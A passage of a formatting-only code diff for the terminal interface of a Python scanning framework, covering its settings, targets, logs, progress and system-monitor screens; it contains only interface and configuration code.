Input(placeholder=\"Search logs...\", id=\"log-search\")\n-                \n+\n             yield Log(id=\"log-display\")\n-            \n+\n     def add_log_entry(self, message: str, level: str = \"INFO\"):\n         \"\"\"Add a new log entry\"\"\"\n         timestamp = datetime.now().strftime(\"%H:%M:%S\")\n         formatted_message = f\"[{timestamp}] {level}: {message}\"\n-        \n+\n         # Add to queue for processing\n         self.log_queue.put((level, formatted_message))\n-        \n+\n         # Update display if level matches filter\n         if self.filter_level == \"ALL\" or level == self.filter_level:\n             log_display = self.query_one(\"#log-display\", Log)\n             log_display.write_line(formatted_message)\n-            \n+\n     @on(Select.Changed, \"#log-level-filter\")\n     def filter_logs(self, event):\n         \"\"\"Filter logs by level\"\"\"\n         self.filter_level = event.value\n         # Refresh log display with new filter\n         self.refresh_log_display()\n-        \n+\n     @on(Input.Changed, \"#log-search\")\n     def search_logs(self, event):\n         \"\"\"Search logs by text\"\"\"\n         search_term = event.value.lower()\n         # Implement log searching\n         pass\n-        \n+\n     def refresh_log_display(self):\n         \"\"\"Refresh the log display with current filters\"\"\"\n         log_display = self.query_one(\"#log-display\", Log)\n         log_display.clear()\n-        \n+\n         # Re-add filtered messages\n         # This would iterate through stored log messages\n         pass\n-        \n+\n     def clear_logs(self):\n         \"\"\"Clear all log entries\"\"\"\n         log_display = self.query_one(\"#log-display\", Log)\n         log_display.clear()\n-        \n+\n         # Clear queue\n         while not self.log_queue.empty():\n-            self.log_queue.get()\n\\ No newline at end of file\n+            self.log_queue.get()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/settings.py\t2025-09-14 19:10:58.581755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/settings.py\t2025-09-14 19:23:14.914617+00:00\n@@ -2,260 +2,305 @@\n Settings Management Screen for Bl4ckC3ll_PANTHEON TUI\n Interactive configuration management\n \"\"\"\n \n from textual.containers import Container, Horizontal, Vertical\n-from textual.widgets import Static, Button, Label, Input, Select, Checkbox, TabbedContent, TabPane\n+from textual.widgets import (\n+    Static,\n+    Button,\n+    Label,\n+    Input,\n+    Select,\n+    Checkbox,\n+    TabbedContent,\n+    TabPane,\n+)\n from textual.widget import Widget\n from textual import on\n import json\n from pathlib import Path\n \n \n class GeneralSettingsPanel(Static):\n     \"\"\"General framework settings\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"General Settings\", classes=\"widget-title\")\n-        \n-        with Vertical():\n-            yield Label(\"Parallel Jobs:\", classes=\"form-label\") \n+\n+        with Vertical():\n+            yield Label(\"Parallel Jobs:\", classes=\"form-label\")\n             yield Input(value=\"20\", id=\"parallel-jobs\")\n-            \n+\n             yield Label(\"HTTP Timeout (seconds):\", classes=\"form-label\")\n             yield Input(value=\"15\", id=\"http-timeout\")\n-            \n+\n             yield Label(\"Requests Per Second:\", classes=\"form-label\")\n             yield Input(value=\"500\", id=\"rps-limit\")\n-            \n+\n             yield Label(\"Max Concurrent Scans:\", classes=\"form-label\")\n             yield Input(value=\"8\", id=\"max-scans\")\n-            \n+\n             yield Label(\"Auto-save Results:\", classes=\"form-label\")\n-            yield Checkbox(\"Automatically save scan results\", value=True, id=\"auto-save\")\n-            \n+            yield Checkbox(\n+                \"Automatically save scan results\", value=True, id=\"auto-save\"\n+            )\n+\n             yield Label(\"Debug Mode:\", classes=\"form-label\")\n             yield Checkbox(\"Enable debug logging\", value=False, id=\"debug-mode\")\n \n \n class NucleiSettingsPanel(Static):\n     \"\"\"Nuclei scanner configuration\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Nuclei Configuration\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Enable Nuclei:\", classes=\"form-label\")\n-            yield Checkbox(\"Use Nuclei for vulnerability scanning\", value=True, id=\"nuclei-enabled\")\n-            \n+            yield Checkbox(\n+                \"Use Nuclei for vulnerability scanning\", value=True, id=\"nuclei-enabled\"\n+            )\n+\n             yield Label(\"Severity Levels:\", classes=\"form-label\")\n-            yield Select([\n-                (\"All Severities\", \"info,low,medium,high,critical\"),\n-                (\"Medium and Above\", \"medium,high,critical\"), \n-                (\"High and Critical\", \"high,critical\"),\n-                (\"Critical Only\", \"critical\")\n-            ], value=\"info,low,medium,high,critical\", id=\"nuclei-severity\")\n-            \n+            yield Select(\n+                [\n+                    (\"All Severities\", \"info,low,medium,high,critical\"),\n+                    (\"Medium and Above\", \"medium,high,critical\"),\n+                    (\"High and Critical\", \"high,critical\"),\n+                    (\"Critical Only\", \"critical\"),\n+                ],\n+                value=\"info,low,medium,high,critical\",\n+                id=\"nuclei-severity\",\n+            )\n+\n             yield Label(\"Rate Limiting:\", classes=\"form-label\")\n             yield Input(value=\"800\", placeholder=\"Requests per second\", id=\"nuclei-rps\")\n-            \n+\n             yield Label(\"Concurrency:\", classes=\"form-label\")\n-            yield Input(value=\"150\", placeholder=\"Concurrent threads\", id=\"nuclei-concurrency\")\n-            \n+            yield Input(\n+                value=\"150\", placeholder=\"Concurrent threads\", id=\"nuclei-concurrency\"\n+            )\n+\n             yield Label(\"Template Options:\", classes=\"form-label\")\n             yield Checkbox(\"Use all templates\", value=True, id=\"nuclei-all-templates\")\n-            yield Checkbox(\"Include community templates\", value=True, id=\"nuclei-community\")\n+            yield Checkbox(\n+                \"Include community templates\", value=True, id=\"nuclei-community\"\n+            )\n             yield Checkbox(\"Use custom templates\", value=True, id=\"nuclei-custom\")\n \n \n class ScanningSettingsPanel(Static):\n     \"\"\"Scanning behavior settings\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Scanning Configuration\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Reconnaissance Tools:\", classes=\"form-label\")\n             yield Checkbox(\"Use Subfinder\", value=True, id=\"use-subfinder\")\n-            yield Checkbox(\"Use Amass\", value=True, id=\"use-amass\") \n+            yield Checkbox(\"Use Amass\", value=True, id=\"use-amass\")\n             yield Checkbox(\"Use HTTPx\", value=True, id=\"use-httpx\")\n-            \n+\n             yield Label(\"Discovery Tools:\", classes=\"form-label\")\n             yield Checkbox(\"Use GAU\", value=True, id=\"use-gau\")\n             yield Checkbox(\"Use Katana\", value=True, id=\"use-katana\")\n             yield Checkbox(\"Use Waybackurls\", value=True, id=\"use-waybackurls\")\n-            \n+\n             yield Label(\"Subdomain Depth:\", classes=\"form-label\")\n-            yield Select([\n-                (\"1 Level\", \"1\"),\n-                (\"2 Levels\", \"2\"),\n-                (\"3 Levels\", \"3\"), \n-                (\"Unlimited\", \"0\")\n-            ], value=\"3\", id=\"subdomain-depth\")\n-            \n+            yield Select(\n+                [\n+                    (\"1 Level\", \"1\"),\n+                    (\"2 Levels\", \"2\"),\n+                    (\"3 Levels\", \"3\"),\n+                    (\"Unlimited\", \"0\"),\n+                ],\n+                value=\"3\",\n+                id=\"subdomain-depth\",\n+            )\n+\n             yield Label(\"Crawl Time Limit (seconds):\", classes=\"form-label\")\n             yield Input(value=\"600\", id=\"crawl-timeout\")\n \n \n class ReportSettingsPanel(Static):\n     \"\"\"Report generation settings\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Report Configuration\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Report Formats:\", classes=\"form-label\")\n             yield Checkbox(\"Generate HTML reports\", value=True, id=\"report-html\")\n             yield Checkbox(\"Generate JSON reports\", value=True, id=\"report-json\")\n             yield Checkbox(\"Generate PDF reports\", value=False, id=\"report-pdf\")\n             yield Checkbox(\"Generate XML reports\", value=False, id=\"report-xml\")\n-            \n+\n             yield Label(\"Report Options:\", classes=\"form-label\")\n             yield Checkbox(\"Auto-open HTML reports\", value=True, id=\"auto-open-html\")\n             yield Checkbox(\"Include screenshots\", value=True, id=\"include-screenshots\")\n-            yield Checkbox(\"Include raw tool output\", value=False, id=\"include-raw-output\")\n-            \n+            yield Checkbox(\n+                \"Include raw tool output\", value=False, id=\"include-raw-output\"\n+            )\n+\n             yield Label(\"Report Template:\", classes=\"form-label\")\n-            yield Select([\n-                (\"Professional\", \"professional\"),\n-                (\"Executive Summary\", \"executive\"),\n-                (\"Technical Details\", \"technical\"),\n-                (\"Compliance Report\", \"compliance\")\n-            ], value=\"professional\", id=\"report-template\")\n+            yield Select(\n+                [\n+                    (\"Professional\", \"professional\"),\n+                    (\"Executive Summary\", \"executive\"),\n+                    (\"Technical Details\", \"technical\"),\n+                    (\"Compliance Report\", \"compliance\"),\n+                ],\n+                value=\"professional\",\n+                id=\"report-template\",\n+            )\n \n \n class AdvancedSettingsPanel(Static):\n     \"\"\"Advanced configuration options\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Advanced Configuration\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Resource Management:\", classes=\"form-label\")\n             yield Input(value=\"85\", placeholder=\"CPU threshold %\", id=\"cpu-threshold\")\n-            yield Input(value=\"90\", placeholder=\"Memory threshold %\", id=\"memory-threshold\")\n+            yield Input(\n+                value=\"90\", placeholder=\"Memory threshold %\", id=\"memory-threshold\"\n+            )\n             yield Input(value=\"95\", placeholder=\"Disk threshold %\", id=\"disk-threshold\")\n-            \n+\n             yield Label(\"Plugin Settings:\", classes=\"form-label\")\n             yield Checkbox(\"Enable plugin system\", value=True, id=\"plugins-enabled\")\n             yield Input(placeholder=\"Plugin directory path\", id=\"plugin-directory\")\n-            \n+\n             yield Label(\"Backup Configuration:\", classes=\"form-label\")\n             yield Checkbox(\"Auto-backup configurations\", value=True, id=\"auto-backup\")\n-            yield Input(value=\"30\", placeholder=\"Keep backups for days\", id=\"backup-retention\")\n+            yield Input(\n+                value=\"30\", placeholder=\"Keep backups for days\", id=\"backup-retention\"\n+            )\n \n \n class SettingsControlPanel(Static):\n     \"\"\"Save, load, and reset configuration controls\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Configuration Management\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             with Horizontal():\n-                yield Button(\"Save Configuration\", variant=\"success\", id=\"btn-save-config\")\n-                yield Button(\"Load Configuration\", variant=\"primary\", id=\"btn-load-config\")\n-                \n+                yield Button(\n+                    \"Save Configuration\", variant=\"success\", id=\"btn-save-config\"\n+                )\n+                yield Button(\n+                    \"Load Configuration\", variant=\"primary\", id=\"btn-load-config\"\n+                )\n+\n             with Horizontal():\n-                yield Button(\"Reset to Defaults\", variant=\"error\", id=\"btn-reset-config\")\n+                yield Button(\n+                    \"Reset to Defaults\", variant=\"error\", id=\"btn-reset-config\"\n+                )\n                 yield Button(\"Export Config\", variant=\"default\", id=\"btn-export-config\")\n-                \n+\n             yield Label(\"Configuration Status:\", classes=\"form-label\")\n             yield Static(\"Ready\", id=\"config-status\", classes=\"status-ready\")\n-            \n+\n     @on(Button.Pressed, \"#btn-save-config\")\n     def save_configuration(self):\n         \"\"\"Save current configuration to file\"\"\"\n         try:\n             config = self.collect_config_values()\n             config_file = Path(__file__).parent.parent.parent / \"p4nth30n.cfg.json\"\n-            \n-            with open(config_file, 'w') as f:\n+\n+            with open(config_file, \"w\") as f:\n                 json.dump(config, f, indent=2)\n-                \n+\n             self.query_one(\"#config-status\").update(\"Configuration saved successfully\")\n             self.query_one(\"#config-status\").classes = \"status-success\"\n-            \n+\n         except Exception as e:\n             self.query_one(\"#config-status\").update(f\"Error saving config: {e}\")\n             self.query_one(\"#config-status\").classes = \"status-error\"\n-            \n+\n     @on(Button.Pressed, \"#btn-load-config\")\n     def load_configuration(self):\n         \"\"\"Load configuration from file\"\"\"\n         try:\n             config_file = Path(__file__).parent.parent.parent / \"p4nth30n.cfg.json\"\n-            \n+\n             if config_file.exists():\n-                with open(config_file, 'r') as f:\n+                with open(config_file, \"r\") as f:\n                     config = json.load(f)\n-                    \n+\n                 self.apply_config_values(config)\n-                self.query_one(\"#config-status\").update(\"Configuration loaded successfully\")\n+                self.query_one(\"#config-status\").update(\n+                    \"Configuration loaded successfully\"\n+                )\n                 self.query_one(\"#config-status\").classes = \"status-success\"\n             else:\n                 self.query_one(\"#config-status\").update(\"No configuration file found\")\n                 self.query_one(\"#config-status\").classes = \"status-warning\"\n-                \n+\n         except Exception as e:\n             self.query_one(\"#config-status\").update(f\"Error loading config: {e}\")\n             self.query_one(\"#config-status\").classes = \"status-error\"\n-            \n+\n     @on(Button.Pressed, \"#btn-reset-config\")\n     def reset_configuration(self):\n         \"\"\"Reset all settings to default values\"\"\"\n         # Implementation to reset all form fields to defaults\n         self.query_one(\"#config-status\").update(\"Configuration reset to defaults\")\n         self.query_one(\"#config-status\").classes = \"status-info\"\n-        \n+\n     def collect_config_values(self):\n         \"\"\"Collect all configuration values from form fields\"\"\"\n         config = {\n             \"limits\": {\n                 \"parallel_jobs\": int(self.app.query_one(\"#parallel-jobs\").value or 20),\n                 \"http_timeout\": int(self.app.query_one(\"#http-timeout\").value or 15),\n                 \"rps\": int(self.app.query_one(\"#rps-limit\").value or 500),\n-                \"max_concurrent_scans\": int(self.app.query_one(\"#max-scans\").value or 8)\n+                \"max_concurrent_scans\": int(\n+                    self.app.query_one(\"#max-scans\").value or 8\n+                ),\n             },\n             \"nuclei\": {\n                 \"enabled\": self.app.query_one(\"#nuclei-enabled\").value,\n                 \"severity\": self.app.query_one(\"#nuclei-severity\").value,\n                 \"rps\": int(self.app.query_one(\"#nuclei-rps\").value or 800),\n                 \"conc\": int(self.app.query_one(\"#nuclei-concurrency\").value or 150),\n-                \"all_templates\": self.app.query_one(\"#nuclei-all-templates\").value\n-            }\n+                \"all_templates\": self.app.query_one(\"#nuclei-all-templates\").value,\n+            },\n             # Add more configuration sections...\n         }\n         return config\n-        \n+\n     def apply_config_values(self, config):\n         \"\"\"Apply configuration values to form fields\"\"\"\n         # Implementation to set form field values from config\n         pass\n \n \n class SettingsScreen(Container):\n     \"\"\"Main settings screen with tabbed interface\"\"\"\n-    \n+\n     def compose(self):\n         with TabbedContent():\n             with TabPane(\"General\", id=\"general-tab\"):\n                 yield GeneralSettingsPanel()\n-                \n+\n             with TabPane(\"Nuclei\", id=\"nuclei-tab\"):\n                 yield NucleiSettingsPanel()\n-                \n+\n             with TabPane(\"Scanning\", id=\"scanning-tab\"):\n                 yield ScanningSettingsPanel()\n-                \n+\n             with TabPane(\"Reports\", id=\"reports-tab\"):\n                 yield ReportSettingsPanel()\n-                \n+\n             with TabPane(\"Advanced\", id=\"advanced-tab\"):\n                 yield AdvancedSettingsPanel()\n-                \n+\n         yield SettingsControlPanel()\n-        \n+\n     def on_mount(self):\n         \"\"\"Initialize settings screen\"\"\"\n         # Load current configuration values\n-        pass\n\\ No newline at end of file\n+        pass\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/scan_progress.py\t2025-09-14 19:10:58.581755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/scan_progress.py\t2025-09-14 19:23:14.943536+00:00\n@@ -8,49 +8,49 @@\n from textual.reactive import reactive\n \n \n class ScanProgress(Static):\n     \"\"\"Real-time scan progress widget\"\"\"\n-    \n+\n     progress = reactive(0)\n     phase = reactive(\"Idle\")\n     status = reactive(\"Not Started\")\n-    \n+\n     def compose(self):\n         yield Label(\"Scan Progress\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(self.status, id=\"scan-status\")\n             yield Label(self.phase, id=\"scan-phase\")\n             yield ProgressBar(total=100, show_percentage=True, id=\"progress-bar\")\n-            \n+\n     def watch_progress(self, progress: int):\n         \"\"\"Update progress bar when progress changes\"\"\"\n         progress_bar = self.query_one(\"#progress-bar\", ProgressBar)\n         progress_bar.progress = progress\n-        \n+\n     def watch_phase(self, phase: str):\n         \"\"\"Update phase display when phase changes\"\"\"\n         phase_label = self.query_one(\"#scan-phase\", Label)\n         phase_label.update(f\"Phase: {phase}\")\n-        \n+\n     def watch_status(self, status: str):\n         \"\"\"Update status display when status changes\"\"\"\n         status_label = self.query_one(\"#scan-status\", Label)\n         status_label.update(f\"Status: {status}\")\n-        \n+\n     def start_scan(self):\n         \"\"\"Start scan progress tracking\"\"\"\n         self.status = \"Running\"\n         self.phase = \"Initializing\"\n         self.progress = 0\n-        \n+\n     def stop_scan(self):\n         \"\"\"Stop scan progress tracking\"\"\"\n         self.status = \"Stopped\"\n         self.phase = \"Idle\"\n-        \n+\n     def complete_scan(self):\n         \"\"\"Mark scan as completed\"\"\"\n         self.status = \"Complete\"\n         self.phase = \"Finished\"\n-        self.progress = 100\n\\ No newline at end of file\n+        self.progress = 100\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/targets.py\t2025-09-14 19:10:58.581755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/targets.py\t2025-09-14 19:23:14.955417+00:00\n@@ -12,153 +12,161 @@\n import logging\n \n \n class TargetInputPanel(Static):\n     \"\"\"Target input and validation panel\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Target Management\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Add Single Target:\", classes=\"form-label\")\n             with Horizontal():\n                 yield Input(placeholder=\"domain.com or 192.168.1.1\", id=\"single-target\")\n                 yield Button(\"Add\", variant=\"primary\", id=\"btn-add-target\")\n-                \n+\n             yield Label(\"Bulk Import:\", classes=\"form-label\")\n-            yield TextArea(placeholder=\"Enter multiple targets, one per line\", id=\"bulk-targets\")\n+            yield TextArea(\n+                placeholder=\"Enter multiple targets, one per line\", id=\"bulk-targets\"\n+            )\n             with Horizontal():\n-                yield Button(\"Import Targets\", variant=\"success\", id=\"btn-import-targets\")\n+                yield Button(\n+                    \"Import Targets\", variant=\"success\", id=\"btn-import-targets\"\n+                )\n                 yield Button(\"Load from File\", variant=\"default\", id=\"btn-load-file\")\n-                \n+\n             yield Label(\"Target Validation:\", classes=\"form-label\")\n             yield Static(\"\", id=\"validation-status\")\n-            \n+\n     @on(Button.Pressed, \"#btn-add-target\")\n     def add_single_target(self):\n         \"\"\"Add a single target\"\"\"\n         target_input = self.query_one(\"#single-target\", Input)\n         target = target_input.value.strip()\n-        \n+\n         if self.validate_target(target):\n             # Query from the screen root instead of parent\n             try:\n                 target_list = self.screen.query_one(\"#target-list\", DataTable)\n                 target_list.add_row(target, \"Valid\", \"Active\", \"Not Scanned\")\n                 target_input.value = \"\"\n                 self.query_one(\"#validation-status\").update(f\"Added target: {target}\")\n             except Exception as e:\n-                self.query_one(\"#validation-status\").update(f\"Error adding target: {str(e)}\")\n+                self.query_one(\"#validation-status\").update(\n+                    f\"Error adding target: {str(e)}\"\n+                )\n         else:\n             self.query_one(\"#validation-status\").update(f\"Invalid target: {target}\")\n-            \n+\n     @on(Button.Pressed, \"#btn-import-targets\")\n     def import_bulk_targets(self):\n         \"\"\"Import multiple targets from text area\"\"\"\n         bulk_input = self.query_one(\"#bulk-targets\", TextArea)\n-        targets = [line.strip() for line in bulk_input.text.split('\\n') if line.strip()]\n-        \n+        targets = [line.strip() for line in bulk_input.text.split(\"\\n\") if line.strip()]\n+\n         valid_count = 0\n         invalid_count = 0\n-        \n+\n         try:\n             target_list = self.screen.query_one(\"#target-list\", DataTable)\n-            \n+\n             for target in targets:\n                 if self.validate_target(target):\n                     target_list.add_row(target, \"Valid\", \"Active\", \"Not Scanned\")\n                     valid_count += 1\n                 else:\n                     invalid_count += 1\n-                    \n+\n             bulk_input.text = \"\"\n             self.query_one(\"#validation-status\").update(\n                 f\"Imported {valid_count} valid targets, {invalid_count} invalid\"\n             )\n         except Exception as e:\n-            self.query_one(\"#validation-status\").update(f\"Error importing targets: {str(e)}\")\n-        \n+            self.query_one(\"#validation-status\").update(\n+                f\"Error importing targets: {str(e)}\"\n+            )\n+\n     def validate_target(self, target):\n         \"\"\"Validate target format (domain or IP)\"\"\"\n         # Basic domain regex\n         domain_pattern = re.compile(\n-            r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?\\.)*[a-zA-Z0-9](?:[a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?$'\n+            r\"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?\\.)*[a-zA-Z0-9](?:[a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?$\"\n         )\n-        \n-        # Basic IP regex  \n+\n+        # Basic IP regex\n         ip_pattern = re.compile(\n-            r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'\n+            r\"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\"\n         )\n-        \n+\n         return bool(domain_pattern.match(target)) or bool(ip_pattern.match(target))\n \n \n class TargetListPanel(Static):\n     \"\"\"Display and manage current targets\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Current Targets\", classes=\"widget-title\")\n-        \n+\n         # Create targets table\n         table = DataTable(id=\"target-list\")\n         table.add_columns(\"Target\", \"Status\", \"State\", \"Last Scan\")\n-        \n+\n         # Load existing targets if any\n         self.load_existing_targets(table)\n-        \n+\n         yield table\n-        \n+\n         with Horizontal():\n             yield Button(\"Remove Selected\", variant=\"error\", id=\"btn-remove-target\")\n             yield Button(\"Clear All\", variant=\"error\", id=\"btn-clear-all\")\n-            yield Button(\"Export List\", variant=\"default\", id=\"btn-export-list\") \n+            yield Button(\"Export List\", variant=\"default\", id=\"btn-export-list\")\n             yield Button(\"Refresh Status\", variant=\"default\", id=\"btn-refresh-status\")\n-            \n+\n     def load_existing_targets(self, table):\n         \"\"\"Load targets from targets.txt file\"\"\"\n         try:\n             targets_file = Path(__file__).parent.parent.parent / \"targets.txt\"\n             if targets_file.exists():\n                 content = targets_file.read_text().strip()\n                 if content:\n-                    for target in content.split('\\n'):\n+                    for target in content.split(\"\\n\"):\n                         target = target.strip()\n                         if target:\n                             table.add_row(target, \"Valid\", \"Active\", \"Not Scanned\")\n         except Exception as e:\n             logging.warning(f\"Failed to load existing targets: {e}\")\n-            \n+\n     @on(Button.Pressed, \"#btn-remove-target\")\n     def remove_selected_target(self):\n         \"\"\"Remove selected target from list\"\"\"\n         table = self.query_one(\"#target-list\", DataTable)\n         if table.cursor_row is not None:\n             table.remove_row(table.cursor_row)\n-            \n+\n     @on(Button.Pressed, \"#btn-clear-all\")\n     def clear_all_targets(self):\n         \"\"\"Clear all targets from list\"\"\"\n         table = self.query_one(\"#target-list\", DataTable)\n         table.clear()\n-        \n-    @on(Button.Pressed, \"#btn-export-list\") \n+\n+    @on(Button.Pressed, \"#btn-export-list\")\n     def export_target_list(self):\n         \"\"\"Export targets to file\"\"\"\n         table = self.query_one(\"#target-list\", DataTable)\n         targets = []\n         for row_key in table.rows:\n             row = table.get_row(row_key)\n             targets.append(row[0])  # First column is target\n-            \n+\n         try:\n             targets_file = Path(__file__).parent.parent.parent / \"targets.txt\"\n-            targets_file.write_text('\\n'.join(targets))\n+            targets_file.write_text(\"\\n\".join(targets))\n             # Show confirmation somehow - could add a status message\n             logging.info(f\"Exported {len(targets)} targets to {targets_file}\")\n         except Exception as e:\n             logging.warning(f\"Failed to export targets: {e}\")\n-            \n+\n     @on(Button.Pressed, \"#btn-refresh-status\")\n     def refresh_target_status(self):\n         \"\"\"Refresh target validation status\"\"\"\n         # Re-validate all targets and update status\n         table = self.query_one(\"#target-list\", DataTable)\n@@ -166,41 +174,41 @@\n         pass\n \n \n class TargetStatsPanel(Static):\n     \"\"\"Display target statistics and information\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Target Statistics\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Total Targets: 0\", id=\"total-targets\")\n             yield Label(\"Valid Targets: 0\", id=\"valid-targets\")\n             yield Label(\"Invalid Targets: 0\", id=\"invalid-targets\")\n             yield Label(\"Scanned Targets: 0\", id=\"scanned-targets\")\n             yield Label(\"Active Scans: 0\", id=\"active-scans\")\n-            \n+\n             yield Label(\"Target Types:\", classes=\"form-label\")\n             yield Label(\"  Domains: 0\", id=\"domain-count\")\n             yield Label(\"  IP Addresses: 0\", id=\"ip-count\")\n             yield Label(\"  IP Ranges: 0\", id=\"range-count\")\n-            \n+\n     def update_stats(self):\n         \"\"\"Update statistics display\"\"\"\n         # This would calculate stats from the target list\n         pass\n \n \n class TargetsScreen(Container):\n     \"\"\"Main targets management screen\"\"\"\n-    \n+\n     def compose(self):\n         with Horizontal():\n             with Vertical(classes=\"left-panel\"):\n                 yield TargetInputPanel()\n                 yield TargetStatsPanel()\n-                \n+\n             yield TargetListPanel(classes=\"right-panel\")\n-            \n+\n     def on_mount(self):\n         \"\"\"Initialize targets screen\"\"\"\n-        pass\n\\ No newline at end of file\n+        pass\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/system_monitor.py\t2025-09-14 19:10:58.581755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/system_monitor.py\t2025-09-14 19:23:14.967159+00:00\n@@ -9,63 +9,65 @@\n import threading\n \n \n class SystemMonitor(Static):\n     \"\"\"System resource monitoring widget\"\"\"\n-    \n+\n     def __init__(self, **kwargs):\n         super().__init__(**kwargs)\n         self.monitor_active = True\n         self.monitor_thread = None\n-        \n+\n     def compose(self):\n         yield Label(\"System Monitor\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"CPU: 0%\", id=\"cpu-display\")\n             yield ProgressBar(total=100, id=\"cpu-progress\")\n-            \n+\n             yield Label(\"Memory: 0%\", id=\"memory-display\")\n             yield ProgressBar(total=100, id=\"memory-progress\")\n-            \n+\n             yield Label(\"Network: 0 KB/s\", id=\"network-display\")\n-            \n+\n     def start_monitoring(self):\n         \"\"\"Start system resource monitoring\"\"\"\n         self.monitor_active = True\n         self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)\n         self.monitor_thread.start()\n-        \n+\n     def stop_monitoring(self):\n         \"\"\"Stop system resource monitoring\"\"\"\n         self.monitor_active = False\n-        \n+\n     def _monitor_loop(self):\n         \"\"\"Background monitoring loop\"\"\"\n         while self.monitor_active:\n             try:\n                 # Try to get system stats\n                 import psutil\n-                \n+\n                 cpu_percent = psutil.cpu_percent(interval=1)\n                 memory = psutil.virtual_memory()\n-                \n+\n                 # Update displays\n                 self.query_one(\"#cpu-display\").update(f\"CPU: {cpu_percent:.1f}%\")\n                 self.query_one(\"#cpu-progress\").progress = cpu_percent\n-                \n-                self.query_one(\"#memory-display\").update(f\"Memory: {memory.percent:.1f}%\")\n+\n+                self.query_one(\"#memory-display\").update(\n+                    f\"Memory: {memory.percent:.1f}%\"\n+                )\n                 self.query_one(\"#memory-progress\").progress = memory.percent\n-                \n+\n             except ImportError:\n                 # Fallback without psutil\n                 time.sleep(1)\n             except Exception:\n                 time.sleep(1)\n-                \n+\n     def on_mount(self):\n         \"\"\"Initialize monitoring on mount\"\"\"\n         self.start_monitoring()\n-        \n+\n     def on_unmount(self):\n         \"\"\"Stop monitoring on unmount\"\"\"\n-        self.stop_monitoring()\n\\ No newline at end of file\n+        self.stop_monitoring()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_p4nth30n.py\t2025-09-14 19:10:58.549754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_p4nth30n.py\t2025-09-14 19:23:18.033670+00:00\n@@ -27,57 +27,71 @@\n import importlib.util\n \n # Enhanced modules integration\n try:\n     from enhanced_scanning import (\n-        adaptive_scan_manager, enhanced_scanner, \n-        get_current_success_rate, run_enhanced_scanning\n+        adaptive_scan_manager,\n+        enhanced_scanner,\n+        get_current_success_rate,\n+        run_enhanced_scanning,\n     )\n+\n     ENHANCED_SCANNING_AVAILABLE = True\n except ImportError:\n     ENHANCED_SCANNING_AVAILABLE = False\n \n try:\n     from enhanced_tool_manager import (\n-        tool_manager, enhanced_which, check_tool_availability,\n-        install_missing_tools, get_tool_coverage_report\n+        tool_manager,\n+        enhanced_which,\n+        check_tool_availability,\n+        install_missing_tools,\n+        get_tool_coverage_report,\n     )\n+\n     ENHANCED_TOOL_MANAGER_AVAILABLE = True\n except ImportError:\n     ENHANCED_TOOL_MANAGER_AVAILABLE = False\n \n try:\n     from enhanced_validation import (\n-        enhanced_validator, reliability_tracker,\n-        validate_target_input, validate_targets_file,\n-        get_system_reliability_score\n+        enhanced_validator,\n+        reliability_tracker,\n+        validate_target_input,\n+        validate_targets_file,\n+        get_system_reliability_score,\n     )\n+\n     ENHANCED_VALIDATION_AVAILABLE = True\n except ImportError:\n     ENHANCED_VALIDATION_AVAILABLE = False\n \n try:\n     from performance_monitor import (\n-        performance_monitor, start_performance_monitoring,\n-        stop_performance_monitoring, record_operation_result,\n-        get_current_performance_metrics, is_success_rate_target_met\n+        performance_monitor,\n+        start_performance_monitoring,\n+        stop_performance_monitoring,\n+        